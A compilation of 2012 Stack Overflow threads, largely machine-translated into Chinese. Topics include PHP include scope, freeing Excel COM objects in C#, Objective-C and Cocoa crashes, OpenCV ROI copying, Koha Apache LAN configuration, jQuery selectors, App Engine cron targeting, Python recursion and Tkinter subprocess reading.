> 时间：2012-08-05T22:56:26.477

为什么不让包含文件有一个返回状态数组的函数。然后在其他代码中使用该数组。这样你就不用处理任何范围变量。

```
// states.php
function getStates() {
    return $states;
}

// other.php
function getStateInput() {
     include('states.php');   
     $states = getStates();
     // Do stuff with $states
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-05T22:57:48.293

在您的`include.php`文件中（您必须包含此文件。在您的函数声明*之前包含它）：*

```
$states = array('GA' => 'Georgia', 'SC' => 'South Carolina'); 
```

在你的脚本上：

```
include("include.php");
global $states;

function GetStateInput() {
   ///States are already available as $states
} 
```

祝你好运！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-05T23:25:59.160

我可能会这样做

**包含.php**

```
<?php
$array = array();

$array['foo'] = 'bar';
$array['oof'] = 'rab';
... etc.

return $array;
?> 
```

***框架*****.php**

```
<?php
// previous stuff

function getStateInput()
{
    static $a = NULL;
    if($a === NULL)
        $a = include('include.php');
    // do whatever
    return $a;
}

// other stuff
?> 
```

要么，要么只是在函数中定义数组。这将取决于数组有多大以及 api 的其余部分有多大。如果维护变得更容易将阵列移动到外部文件中 - 执行此操作。如果您在多个不同的函数或方法中使用该数组，请将其拉​​出。等等。你知道演习。

PHP 优化了文件包含，所以如果你不动态包含，不要太担心性能。

# c# - 如何释放为 Excel 创建的对象 (C#)

> ID：11820769
> 
> 赞同：2
> 
> 时间：2012-08-05T22:54:46.123
> 
> 标签：c#, excel

我使用一些对象，如工作簿、工作表、Excel 任务应用程序。完成 Excel 后，我尝试通过下面的代码发布它们。毕竟，我仍然在任务管理器中看到 EXCEL.EXE。为什么不完全释放？

**我的 Excel 任务类：**

```
Excel._Application app = new Excel.Application();
Excel._Workbook workbook = app.Workbooks.Add(Type.Missing);
Excel._Worksheet worksheet = null;
app.Visible = true;

worksheet.Cells[1, 1] = "test string";

workbook.SaveAs("C:\testfile.xlsx");

object misValue = System.Reflection.Missing.Value;
workbook.Close(true, misValue, misValue);
app.Quit();

releaseObject(worksheet2);
releaseObject(workbook);
releaseObject(app); 
```

**释放对象类：**

```
 private void releaseObject(object obj)
    {
        try
        {
            System.Runtime.InteropServices.Marshal.ReleaseComObject(obj);
            obj = null;
        }
        catch (Exception ex)
        {
            obj = null;
            MessageBox.Show("Unable to release the Object " + ex.ToString());
        }
        finally
        {
            GC.Collect();
        }
    } 
```

**EXCEL.EXE 仍在任务管理器中：** ![在此处输入图像描述](../Images/9d41744a2ddbf301903f422cf93c9224.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-06T01:47:58.430

已经回答请看：

[如何正确清理 Excel 互操作对象？](https://stackoverflow.com/questions/158706/how-to-properly-clean-up-excel-interop-objects-in-c-sharp)

基本上 COM 对象是非托管对象 (duh)，并且在超出范围时不会被释放。System.Runtime.InteropServices.Marshal.ReleaseComObject() 可用于在它们最终确定之前释放它们（在垃圾收集器中），但您必须确保保留所有对象的引用：excelApp.Worksheets.Open()创建两个对象：集合“Worksheets”和使用 Open() 方法打开的“Worksheet”。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-26T10:37:59.717

使用进程从任务管理器中杀死 EXCEL 对象非常容易，请参见下文并享受..

```
//Kill the all EXCEL obj from the Task Manager(Process)
System.Diagnostics.Process[] objProcess = System.Diagnostics.Process.GetProcessesByName("EXCEL");

if (objProcess.Length > 0)
{
    System.Collections.Hashtable objHashtable = new System.Collections.Hashtable();

    // check to kill the right process
    foreach (System.Diagnostics.Process processInExcel in objProcess)
    {
        if (objHashtable.ContainsKey(processInExcel.Id) == false)
        {
             processInExcel.Kill();
        }
    }
    objProcess = null;
}

//In case of you want to quit what you have created the Excel object from your application //just use below condition in above,

    if(processInExcel.MainWindowTitle.ToString()== "") 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-05T23:45:12.380

自从我完成 Office Interop 以来已经有一段时间了（我实际上是在 Outlook 中使用它，但概念应该是相同的）。我能够完全释放一切的唯一方法是这样做：

```
GC.Collect();
GC.WaitForPendingFinalizers();
GC.Collect(); 
```

试一试....

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-06T01:58:10.933

这是我无法解决的问题。我以前看过所有这些答案，并且我已经实现了所有这些答案，但仍然 excel 没有关闭。我不得不用蛮力做事。我所做的是创建了一个 BAT 文件并从我的程序中运行它。这是文件的内容：

```
Taskkill /F /IM excel.exe 
```

这将调用你所有的 Excel 运行。如果您无法找到不同的解决方案，我会使用它。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-05T23:07:21.093

您需要通过这样做来关闭 excel 应用程序，因为它会在后台打开 excel 程序....

```
app .Application.Quit(); 
```

通过以下方式在您的代码中添加上述行代码：

```
 object misValue = System.Reflection.Missing.Value;
    workbook.Close(true, misValue, misValue);
    app .Application.Quit();
    app.Quit(); 
```

# objective-c - Change another class NSString

> ID：11820771
> 
> 赞同：1
> 
> 时间：2012-08-05T22:55:08.547
> 
> 标签：objective-c, nsstring

I know that this question is really old, but I'm having a lot of trouble accessing NSString's from another class;

Let's say that I have `FirstViewController` and `SecondViewController`, and from the `Second` I want to access a NSString called `string` - which is in `FirstViewController` -(okay, I know it's obvious). Here's the code of the `SecondViewController`:

```
FirstViewController *viewController = [[FirstViewController alloc] init];
NSLog(@"%@", viewController.string); 
```

But the result is `(null)`, because it's getting the value from the `init` method.

Anyone have some tip/solution to access the `string` from any place that it's declared?

Thanks!

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T23:05:57.593

如果您正在做我认为您正在做的事情，那么您将`FirstViewController`在第二个视图控制器中创建一个新版本，除非`FirstViewController.string`在 init 块中将其初始化为某个值，否则它将返回一个 nul 值。

我认为您想要的是通过从已创建的项目访问项目来获取字符串的值`FirstViewController`。有多种方法可以做到这一点（取决于你`SecondViewController`从一开始是如何推动的，以及你是否使用故事板。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-06T04:25:38.067

全局变量可能是您的答案。除非您在标签栏控制器中，否则不可能从另一个类中“拉取”数据。可以将您的值从 ViewController1 推送到您的 ViewController2，但为了拉取它，我想说全局变量会为您省去很多麻烦。

# opencv - In openCV, how to replace an RGB ROI in image

> ID：11820772
> 
> 赞同：0
> 
> 时间：2012-08-05T22:55:18.907
> 
> 标签：opencv, rgb

I have an RGB large-image, and an RGB small-image. What is the fastest way to replace a region in the larger image with the smaller one? Can I define a multi-channel ROI and then use copyTo? Or must I split each image to channels, replace the ROI and then recombine them again to one?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-06T04:20:38.610

是的。多通道 ROI 和 copyTo 将起作用。就像是：

```
int main(int argc,char** argv[])
{
    cv::Mat src = cv::imread("c:/src.jpg");

    //create a canvas with 10 pixels extra in each dim. Set all pixels to yellow.
    cv::Mat canvas(src.rows + 20, src.cols + 20, CV_8UC3, cv::Scalar(0, 255, 255));

    //create an ROI that will map to the location we want to copy the image into
    cv::Rect roi(10, 10, src.cols, src.rows);
    //initialize the ROI in the canvas. canvasROI now points to the location we want to copy to.
    cv::Mat canvasROI(canvas(roi));

    //perform the copy.
    src.copyTo(canvasROI);

    cv::namedWindow("original", 256);
    cv::namedWindow("canvas", 256);

    cv::imshow("original", src);
    cv::imshow("canvas", canvas);

    cv::waitKey();  

} 
```

# objective-c - 可可，控制器实例化和崩溃

> ID：11820776
> 
> 赞同：2
> 
> 时间：2012-08-05T22:55:43.640
> 
> 标签：objective-c, cocoa, crash

我正在尝试开发一个简单的应用程序，单击菜单项后，它会显示一个包含 NSTableView 的窗口。问题是应用程序在 NSTableView 显示数据后崩溃。完整的堆栈跟踪：

```
* thread #1: tid = 0x2107, 0x00007fff943bce90 libobjc.A.dylib\`objc_msgSend + 16,
             stop reason = EXC_BAD_ACCESS (code=13, address=0x0)
  frame #0: 0x00007fff943bce90 libobjc.A.dylib`objc_msgSend + 16 
```

由于我使用的是 ARC，我应该排除任何引用计数问题；但也许我正在以一种糟糕的方式创建控制器（需要创建窗口），并且它被错误地释放了。

这是创建和显示窗口的**AppController的代码：**

```
- (IBAction)showPreferences:(id)sender {
    if(!preferencesWindow) {
        preferencesWindow = [[[PreferencesWindowController alloc]
                          initWithWindowNibName:@"PreferencesWindow"] window];
    }

    [preferencesWindow makeKeyAndOrderFront:sender];
} 
```

**PreferencesWindowController**中的这段代码实现了 dataSource 协议（NSTableView 需要）。

```
- (int)numberOfRowsInTableView:(NSTableView *)tabView {
    return 1;
}

- (id)tableView:(NSTableView *)tabView objectValueForTableColumn:(NSTableColumn *)tableColumn row:(int)row {
    NSString *val = [NSString stringWithFormat:@"%@[%d]", [tableColumn identifier], row];
    return val;
} 
```

它本身不会导致崩溃。但是如果我从 NSTableView 的 dataSource 中删除 PreferencesWindowController，它不会崩溃，所以它应该有点相关。

哪里错了？

编辑：使用带有僵尸预设的分析器（仪器），我可以看到有一个对象的引用计数器变为负数：

![仪器截图](../Images/2afa0faefda6b7b27c023100d0c316dc.png)

但无论如何，堆栈在我编写的代码之外。我不能在那里放断点，我看不到哪个对象被释放了两次（或者我应该说我不知道​​怎么做）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T23:31:08.853

该行`preferencesWindow = [[[PreferencesWindowController alloc] initWithWindowNibName:@"PreferencesWindow"] window]`看起来很可疑，因为当您使用强引用引用窗口本身时，看起来您正在让 ARC 释放`PreferencesWindowController`.

尝试将`PreferencesWindowController`对象存储在它自己的`strong`变量/属性中并告诉我。

# lan - Access Koha Staff/OPAC client over LAN network

> ID：11820777
> 
> 赞同：0
> 
> 时间：2012-08-05T22:56:02.767
> 
> 标签：lan, apache-config

I've installed Koha 3.6 - as provided by Vimal Kumar on Ubuntu 10.04 LTS. This works excellently.

However, I want to access the web Staff/OPAC client via LAN, so that I can open the clients on another computer (Windows 7) in addition to accessing it on the Koha machine.

Vimal directed me to this website: [http://kohageek.pbworks.com/w/page/51840331/Network%20Configuration](http://kohageek.pbworks.com/w/page/51840331/Network%20Configuration)

Here is a break down of the instructions, and what I did. This method failed, and I reverted my files back to their original content, and my Staff/OPAC clients work again now, but are still not accessible on LAN.

I've got a router for this, and I connected each computer to the router - they can see each other on the network.

1) **sudo gedit /etc/hosts**
Enter the IP Address and Fully Qualified Domain Name

My original file contains the following:

> 127.0.0.1 localhost
> 127.0.1.1 ansa-desktop
> 
> #The following lines are desirable for IPv6 capable hosts) ::1 localhost ip6-localhost ip6-loopback fe00::0 ip6-localnet
> ff00::0 ip6-mcastprefix
> ff02::1 ip6-allnodes
> ff02::2 ip6-allrouters
> ff02::3 ip6-allhosts

I replaced the top part with:

> 127.0.0.1 localhost
> 192.168.1.10 ansa-desktop

2) **sudo gedit /etc/hostname** Enter the hostname of your system without domain name

My file contains the following:

> ansa-desktop

I didn't make changes in this file - it look right to me.

3) In System --> Preferences -> Network Connections Choose DHCP or Enter Static IP Number, subnet mask and gateway information

I chose the following:

> IP: 192.168.1.10
> Subnetmask:255.255.255.0
> Gateway: 0.0.0.0 (automatically set)

4) **sudo gedit /etc/koha/koha-httpd.conf** Change the IP number in OPAC and Intranet virtual host.

My original file contained the following and the IPs in bold was subsequently swapped with my selected static IP (192.168.1.10):

> # Koha Apache Configuration Directives
> 
> #NameVirtualHost *
> 
> ## OPAC
> '<'VirtualHost **127.0.1.1**:80>
> ServerAdmin webmaster@koha-desktop
> DocumentRoot /usr/share/koha/opac/htdocs
> ServerName koha-desktop
> # ServerAlias opac.mydomain.com
> ScriptAlias /cgi-bin/koha/ "/usr/share/koha/opac/cgi-bin/opac/"
> ScriptAlias /index.html "/usr/share/koha/opac/cgi-bin/opac/opac-main.pl"
> ScriptAlias /opac-search.pl "/usr/share/koha/opac/cgi-bin/opac/opac-search.pl"
> ScriptAlias /search "/usr/share/koha/opac/cgi-bin/opac/opac-search.pl"
> ErrorLog /var/log/koha/koha-opac-error_log
> # CustomLog /var/log/koha/koha-opac-access_log combined
> # TransferLog /var/log/koha/koha-opac-access_log
> SetEnv KOHA_CONF "/etc/koha/koha-conf.xml"
> SetEnv PERL5LIB "/usr/share/koha/lib"
> SetEnv MEMCACHED_SERVERS ""
> SetEnv MEMCACHED_NAMESPACE ""
> 
> ```
>  <IfModule mod_gzip.c>  
>     mod_gzip_on yes  
>     mod_gzip_dechunk yes  
>     mod_gzip_keep_workfiles No  
>     mod_gzip_can_negotiate yes  
>     mod_gzip_update_static No  
>     mod_gzip_temp_dir /tmp  
>     mod_gzip_minimum_file_size 512  
>     mod_gzip_maximum_file_size 1000000  
>     mod_gzip_maximum_inmem_size 1000000  
>     mod_gzip_handle_methods GET POST  
>     mod_gzip_item_exclude reqheader "User-Agent: .*Mozilla/4\..*\["  
>     mod_gzip_item_exclude mime ^image/.*  
>     mod_gzip_item_exclude rspheader Content-Type:image/*  
>     mod_gzip_item_include file \.js$  
>     mod_gzip_item_include mime ^application/javascript$  
>     mod_gzip_item_include mime ^application/x-javascript$  
>     mod_gzip_item_include file \.php$  
>     mod_gzip_item_include mime ^text/html$  
>     mod_gzip_item_include file \.css$  
>     mod_gzip_item_include mime ^text/css$  
>  </IfModule>  
> 
>  <IfModule mod_deflate.c>  
> 
>    # Compress content with type html, text, and css, ...  
>    AddOutputFilterByType DEFLATE text/plain text/html text/xml text/css  
>    AddOutputFilterByType DEFLATE application/xml application/xhtml+xml application/rss+xml application/javascript application/x-javascript  
> 
>    DeflateCompressionLevel 9  
> 
>    # Properly handle old browsers that do not support compression  
>    BrowserMatch ^Mozilla/4 gzip-only-text/html  
>    BrowserMatch ^Mozilla/4\.0[678] no-gzip  
>    BrowserMatch \bMSIE !no-gzip !gzip-only-text/html  
> 
>    DeflateFilterNote Input instream  
>    DeflateFilterNote Output outstream  
>    DeflateFilterNote Ratio ratio  
> 
>    LogFormat '"%r" %{outstream}n/%{instream}n (%{ratio}n%%)' deflate  
>    <IfModule mod_headers.c>  
>       #properly handle requests coming from behind proxies  
>       Header append Vary User-Agent  
>    </IfModule>  
>  </IfModule> 
> ```
> 
> # Repeat this virtualhost stanza changing the following environment vars to
> # create multiple OPAC interfaces with custom css and/or search limits:
> # SetEnv OPAC_CSS_OVERRIDE mystyle.css
> # SetEnv OPAC_SEARCH_LIMIT branch:CODE
> # SetEnv OPAC_LIMIT_OVERRIDE 1
> 
> ```
>  Options +FollowSymLinks  
> 
>   ErrorDocument 400 /cgi-bin/koha/errors/400.pl  
>   ErrorDocument 401 /cgi-bin/koha/errors/401.pl  
>   ErrorDocument 403 /cgi-bin/koha/errors/403.pl  
>   ErrorDocument 404 /cgi-bin/koha/errors/404.pl  
>   ErrorDocument 500 /cgi-bin/koha/errors/500.pl 
> ```
> 
> # Rewrite Rules
> RewriteEngine On
> 
> # Uncomment to turn on rewrite logging
> # RewriteLog /var/log/koha/koha-opac-rewrite.log
> # RewriteLogLevel 1
> RewriteCond %{QUERY_STRING} (.*?)(?:[A-Za-z0-9_-]+)=&(.*)
> RewriteRule (.+) $1?%1%2 [N,R,NE]
> 
> ```
>  RewriteRule ^/bib/([^\/]*)/?$ /cgi-bin/koha/opac-detail\.pl?bib=$1 [PT]  
>   RewriteRule ^/isbn/([^\/]*)/?$ /search?q=isbn:$1 [PT]  
>   RewriteRule ^/issn/([^\/]*)/?$ /search?q=issn:$1 [PT] 
> ```
> 
> ## Intranet
> '<'VirtualHost **127.0.1.1**:8080>
> ServerAdmin webmaster@koha-desktop
> DocumentRoot /usr/share/koha/intranet/htdocs
> ServerName koha-desktop:8080
> # ServerAlias intranet.mydomain.com
> ScriptAlias /cgi-bin/koha/ "/usr/share/koha/intranet/cgi-bin/"
> ScriptAlias /index.html "/usr/share/koha/intranet/cgi-bin/mainpage.pl"
> ScriptAlias /search "/usr/share/koha/intranet/cgi-bin/search.pl"
> ErrorLog /var/log/koha/koha-error_log
> # TransferLog /var/log/koha/koha-access_log
> SetEnv KOHA_CONF "/etc/koha/koha-conf.xml"
> SetEnv PERL5LIB "/usr/share/koha/lib"
> SetEnv MEMCACHED_SERVERS ""
> SetEnv MEMCACHED_NAMESPACE ""
> Options +FollowSymLinks
> 
> ```
>  ErrorDocument 400 /cgi-bin/koha/errors/400.pl  
>   ErrorDocument 401 /cgi-bin/koha/errors/401.pl  
>   ErrorDocument 403 /cgi-bin/koha/errors/403.pl  
>   ErrorDocument 404 /cgi-bin/koha/errors/404.pl  
>   ErrorDocument 500 /cgi-bin/koha/errors/500.pl  
> 
>   <IfModule mod_gzip.c>  
>     mod_gzip_on yes  
>     mod_gzip_dechunk yes  
>     mod_gzip_keep_workfiles No  
>     mod_gzip_can_negotiate yes  
>     mod_gzip_update_static No  
>     mod_gzip_temp_dir /tmp  
>     mod_gzip_minimum_file_size 512  
>     mod_gzip_maximum_file_size 1000000  
>     mod_gzip_maximum_inmem_size 1000000  
>     mod_gzip_handle_methods GET POST  
>     mod_gzip_item_exclude reqheader "User-Agent: .*Mozilla/4\..*\["  
>     mod_gzip_item_exclude mime ^image/.*  
>     mod_gzip_item_exclude rspheader Content-Type:image/*  
>     mod_gzip_item_include file \.js$  
>     mod_gzip_item_include mime ^application/javascript$  
>     mod_gzip_item_include mime ^application/x-javascript$  
>     mod_gzip_item_include file \.php$  
>     mod_gzip_item_include mime ^text/html$  
>     mod_gzip_item_include file \.css$  
>     mod_gzip_item_include mime ^text/css$  
>   </IfModule>  
> 
>   <IfModule mod_deflate.c>  
> 
>     # Compress content with type html, text, and css, ...  
>     AddOutputFilterByType DEFLATE text/plain text/html text/xml text/css  
>     AddOutputFilterByType DEFLATE application/xml application/xhtml+xml application/rss+xml application/javascript application/x-javascript  
> 
>     DeflateCompressionLevel 9  
> 
>     # Properly handle old browsers that do not support compression  
>     BrowserMatch ^Mozilla/4 gzip-only-text/html  
>     BrowserMatch ^Mozilla/4\.0[678] no-gzip  
>     BrowserMatch \bMSIE !no-gzip !gzip-only-text/html  
> 
>     DeflateFilterNote Input instream  
>     DeflateFilterNote Output outstream  
>     DeflateFilterNote Ratio ratio  
> 
>     LogFormat '"%r" %{outstream}n/%{instream}n (%{ratio}n%%)' deflate  
>     <IfModule mod_headers.c>  
>       #properly handle requests coming from behind proxies  
>       Header append Vary User-Agent  
>     </IfModule>  
>  </IfModule>  
> 
>   RewriteEngine On 
> ```
> 
> # Uncomment to turn on rewrite logging
> # RewriteLog /var/log/koha/koha-intranet-rewrite.log
> # RewriteLogLevel 1
> 
> ```
>  RewriteCond %{QUERY_STRING} (.*?)(?:[A-Za-z0-9_-]+)=&(.*)  
>   RewriteRule (.+) $1?%1%2 [N,R,NE]  
>   RewriteRule ^/bib/([^\/]*)/?$ /cgi-bin/koha/detail\.pl?bib=$1 [PT]  
>   RewriteRule ^/isbn/([^\/]*)/?$ /search?q=isbn:$1 [PT]  
>   RewriteRule ^/issn/([^\/]*)/?$ /search?q=issn:$1 [PT] 
> ```
> 
> servername localhost

5) Restart Apache **/etc/init.d/apache2 restart**

This failed (I forgot the error message, but can recreate it if required).

I also have Webmin installed and configured, as part of the Koha install - if this should be relevant.

I have also looked at this article, but couldn't gleam from it a resolve for my problem:[stackoverflow article](https://stackoverflow.com/questions/2121159/what-is-the-mac-equivalent-of-etc-apache2-sites-available)

If anyone can tell me why this didn't work and how to make it work, I would really appreciated it.

Thanks Jurgens

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-03-27T10:16:51.737

你真的不需要所有这些配置，如果你使用 live dvd 一切都已经配置好了。

您需要做的就是去您的终端并运行 ifconfig 以查看您机器上的 IP 地址，您将在所有其他系统的地址栏中输入此 IP 地址，他们将看到您的 Koha。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-06T02:59:42.620

这根本不是一个特定的问题。这是如何让您的 apache 服务器在您的 LAN 上响应。

首先做一个 sudo ifconfig

找出你的服务器的IP是什么。然后设置 apache 来监听那个地址。

在这方面，Koha 没有什么特别之处，它只是一个网站。所以你只需要 apache2 回答你局域网上的 IP 号码。不是 127.0.0.1

Koha也不需要webmin

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-03-03T06:24:55.800

请检查您的 koha 服务器和客户端计算机上是否有相同的网络......在我们的例子中，koha 可以使用其 IP 地址通过 LAN 访问。

您可能还需要检查网络配置本身。例如，如果您的客户端 PC 无法 ping 到 koha 服务器的任何请求，那么您的网络配置可能是问题所在。

我们的 koha 在 LAN 上工作，无需在“koha-httpd.conf”上进行任何配置。

# jquery - 根据提交按钮的值隐藏 div

> ID：11820778
> 
> 赞同：0
> 
> 时间：2012-08-05T22:56:03.413
> 
> 标签：jquery

我希望隐藏一个值为“foo”的提交按钮，**但**前提是它所在的 div 具有“foo2”类。

下面的 jQuery 完成了一半的工作，如果提交按钮的值包含“foo”，则隐藏提交按钮，但是它可以全面工作，无论它是否在 foo2 内。

```
<script type="text/javascript">
$(document).ready(function () {
   $("input[value=foo]").closest('div').hide();
});
</script> 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T23:00:34.537

你所需要的只是用它的类名来调用 div

```
<script type="text/javascript">
$(document).ready(function () {
   $("input[value=foo]").closest('div.foo2').hide();
});
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T23:00:24.140

只需将 div 的要求添加到`closest`选择器中：

```
$("input[value=foo]").closest('div.foo2').hide(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-05T23:01:40.910

修改选择器而不是 .closest 运算符可能更干净。如果实际上有另一个带有 foo2 类的 div：

```
$(".foo2 input[value=foo]").closest('div').hide(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-05T23:05:12.453

如果您只想隐藏按钮而不是整个 div：

```
<script type="text/javascript">
$(document).ready(function () {
   $("div.foo2 input[value=foo]").closest('div.foo2').find("input[value=foo]").hide();
});
</script> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-05T23:05:17.973

尝试以下操作：

```
$('div.foo2').has('input[value=foo]').hide() 
```

# php - How to remove period at end of first function while allowing period at end after combining function

> ID：11820785
> 
> 赞同：-1
> 
> 时间：2012-08-05T22:56:26.670
> 
> 标签：php, html, wordpress

First I need to remove a period at the end of this function which displays a description on my wordpress theme. For example a particular description will display as........... Visit the wonderful city.

```
<?php post_description(); ?> 
```

After removing period, I need to add a city at the end of first function to make it 1 sentence, such as...Visit the wonderful city of Akron.

This is the taxonomy code that displays the city

```
 <?php echo appthemes_get_custom_city($post->ID, CITY_TAX_NAME, 'name'); ?>** 
```

here is entire code............

```
 <!-- #main -->

                    </div> <!-- #head-box -->

                    <div class="box-bottom">&nbsp;</div>

                    <div class="text-box">

                    <?php appthemes_before_post_description(); ?>

                    <?php appthemes_post_description(); ?>

                    <?php post_description(); ?>

                    <?php city_edit_link(); ?>

                    <?php clpr_reset_link(); ?>

                    <?php appthemes_after_post_description(); ?> 

                  </div> 
```

now I implemented this code.........

```
<?php

$content = trim(get_the_content());
if(substr($content, -4) == '</p>') {
echo substr($content, 0, -4);
echo appthemes_get_custom_city($post->ID, CITY_TAX_NAME, 'name');
echo '</p>';
}
else{
echo $content, of, " ",  appthemes_get_custom_city($post->ID, CITY_TAX_NAME, 'name');                                                          
echo '.';
} ?> 
```

But it displays as......... Visit the wonderful city. of Akron.

How can I remove the period while allowing period at end of sentence.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T23:10:00.703

为“参观美妙的城市”创建一个变量。并截断句点。然后使用现在缺少句点的变量代替该字符串来自的任何位置（我不使用 Wordpress）。

# java - 测试非默认 App Engine cron 作业

> ID：11820788
> 
> 赞同：1
> 
> 时间：2012-08-05T22:57:05.967
> 
> 标签：java, google-app-engine, cron

我在 Google App Engine (Java) 中设置了一个 Cron 作业并将其部署到非默认版本。这是 cron.xml 的摘录：

```
<cron>
  <url>/_ah/cron/argosCheck</url>
  <schedule>every 1 hours</schedule>
</cron> 
```

cron 作业出现在仪表板上，但失败：

```
/_ah/cron/argosCheck
<description>Trigger an Argos Web Services poll</description>
Trigger an Argos Web Services poll   every 1 hours (UTC) 
2012/08/05 22:05:12 on time Failed 
```

我已经验证处理程序有效，我可以手动触发该过滤器。其他 cron 作业在默认版本中工作正常。问题是：我是否需要指定一个绝对 URL 以部署该 cron 作业的非默认版本为目标？cron 作业的调度程序是否仅使用默认版本运行？（不记得在任何地方读过，但如果它在文档中并且我错过了，请告诉我）

类似于这个问题[Testing non-default App Engine task queues](https://stackoverflow.com/questions/11197058/testing-non-default-app-engine-task-queues)。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-06T07:08:36.400

两个注意事项：

1.  您不应该在`/_ah/*`路径上注册您的处理程序（servlet）。这是为系统服务保留的。如果映射错误，您可能会阻止访问系统提供的 url。
2.  您可以将[`target`参数与 Cron](https://developers.google.com/appengine/docs/java/config/cron#Cron_and_App_Versions)一起使用来定义应用程序版本。

# python - 无法理解递归

> ID：11820789
> 
> 赞同：3
> 
> 时间：2012-08-05T22:57:07.147
> 
> 标签：python

刚接触 Python 并试图理解递归。我正在尝试制作一个程序，该程序使用递归函数打印出在字符串“目标”中找到字符串“键”的次数，如 MIT 介绍课程[问题集](http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/assignments/pset3.pdf)的问题 1 中所示。我在试图弄清楚该函数将如何运行时遇到问题。我已经阅读了文档和一些关于它的教程，但是有没有人有任何关于如何更好地理解递归来帮助我修复这段代码的提示？

```
from string import *

def countR(target,key):
    numb = 0
    if target.find(key) == -1:
        print numb
    else:
        numb +=1
        return countR(target[find(target,key):],key)

countR('ajdkhkfjsfkajslfajlfjsaiflaskfal','a') 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-05T23:03:42.590

通过递归，您希望将问题拆分为较小的子问题，您可以独立解决这些子问题，然后将它们的解决方案组合在一起以获得最终解决方案。

在您的情况下，您可以将任务分为两部分：检查第一次出现的位置（如果）`key`，然后递归计算其余部分。

里面是否有键：
- 否：返回 0。
- 是：删除`key`并说键的数量是 1 +`key`其余的数量

在代码中：

```
def countR(target,key):
    if target.find(key) == -1:
        return 0
    else:
        return 1+ countR(target[target.find(key)+len(key):],key) 
```

**编辑**：
以下代码然后打印所需的结果：

```
print(countR('ajdkhkfjsfkajslfajlfjsaiflaskfal','a')) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-05T23:07:11.413

这不是递归的工作方式。`numb`没用 - 每次您进入递归时，`numb`都会再次创建为 0，因此它只能是 0 或 1 - 绝不是您寻求的实际结果。

递归的工作原理是找到小问题的答案，然后用它来解决大问题。在这种情况下，您需要在不包含第一次出现的字符串中找到键的出现次数，并将其加 1。

此外，您需要实际推进切片，以便您刚刚找到的字符串不会再次出现。

```
from string import *

def countR(target,key):
    if target.find(key) == -1:
        return 0
    else:
        return 1+countR(target[target.find(key)+len(key):],key)

print(countR('ajdkhkfjsfkajslfajlfjsaiflaskfal','a')) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-05T23:19:15.613

我见过的大多数递归函数都强调返回一个有趣的值，在此基础上构建更高的帧。你的函数没有这样做，这可能就是它让你感到困惑的原因。这是一个递归函数，可为您提供整数的阶乘：

```
def factorial(n):
    """return the factorial of any positive integer n"""
    if n > 1:
        return n * factorial(n - 1)
    else:
        return 1 # Cheating a little bit by ignoring illegal values of n 
```

上面的函数演示了我称之为“正常”类型的递归——内部框架返回的值由外部框架操作。

您的功能有点不寻常，因为它：

1.  并不总是返回一个值。
2.  外框不会对内框的返回值做任何事情。

让我们看看我们是否可以重构它以遵循更传统的递归模式。（写成*剧透*语法，所以你可以看看你是否可以自己得到它，首先）：

> def countR(target,key): idx = target.find(key)` if idx > -1: return 1 + countR(target[idx + 1:], key) else: return 0

在这里，每次找到目标时`countR`添加，然后在字符串的其余部分上重复。`1`如果它没有找到匹配项，它仍然会返回一个值，但它会做两件关键的事情：

1.  添加到外框时，不会更改值。
2.  不再复发。

（好吧，所以关键的事情是它*不做*的事情。你明白了。）

元/编辑：尽管有[这篇元文章](https://meta.stackexchange.com/questions/105735/how-can-i-put-a-whole-code-block-in-spoiler-text)，但显然不可能在剧透文本中正确格式化代码。所以我会保持它未格式化，直到该功能被修复，或者永远，以先到者为准。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-05T23:03:35.590

如果在目标中找不到键，则打印 numb，否则创建一个新字符串，在找到的匹配项之后开始（因此剪掉开头）并从那里继续搜索。

# python - Tkinter GUI 仅在鼠标移动时更新

> ID：11820795
> 
> 赞同：3
> 
> 时间：2012-08-05T22:58:50.363
> 
> 标签：python, multithreading, tkinter

我正在运行一个 Tkinter GUI，它`subprocess.Popen(...)`使用 stdout 和 stderr 分离另一个进程（python 脚本）并使用管道。然后我将分离一个单独的线程以异步读取该进程中的 out/err 并将其绘制到 Tkinter Text 小部件中`threading.Thread`。

一切都很好，除了异步。读取线程仅在我移动鼠标或按下键盘上的键时执行。我什至将打印语句放入线程函数中，当我在圆圈中移动鼠标时它们开始/停止打印。

这是我正在使用的异步读取类，从[这里](http://stefaanlippens.net/python-asynchronous-subprocess-pipe-reading)借来的：

```
class AsynchronousFileReader(threading.Thread):
    '''
    Helper class to implement asynchronous reading of a file
    in a separate thread. Pushes read lines on a queue to
    be consumed in another thread.
    '''

    def __init__(self, fd, queue):
        assert isinstance(queue, Queue.Queue)
        assert callable(fd.readline)
        threading.Thread.__init__(self)
        self._fd = fd
        self._queue = queue

    def run(self):
        '''The body of the tread: read lines and put them on the queue.'''
        for line in iter(self._fd.readline, ''):
            self._queue.put(line)

    def eof(self):
        '''Check whether there is no more content to expect.'''
        return not self.is_alive() and self._queue.empty() 
```

